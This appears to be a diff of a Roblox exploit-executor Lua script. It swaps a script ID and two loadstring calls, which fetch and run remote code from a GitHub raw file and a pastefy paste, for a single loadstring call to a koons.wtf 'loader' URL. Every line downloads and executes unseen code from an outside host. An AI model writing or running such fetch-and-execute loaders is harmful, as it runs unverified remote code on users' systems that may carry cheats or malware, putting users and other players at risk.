@@ -1,3 +1,1 @@
-getgenv().SCRIPT_ID = "96a868d8f6060ad17677ca3fe67b8979"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/v1xtra/Games/refs/heads/main/adm.lua"))()
-loadstring(game:HttpGet("https://pastefy.app/YG8MmDsX/raw"))()
+loadstring(game:HttpGet("https://koons.wtf/run/eyJpZCI6Imtvb25zXzFlMWI1M2NhMmI0NTkiLCJraW5kIjoibG9hZGVyIiwidmlzdWFsIjp7ImlkIjoibm9uZSJ9fQ=="))()
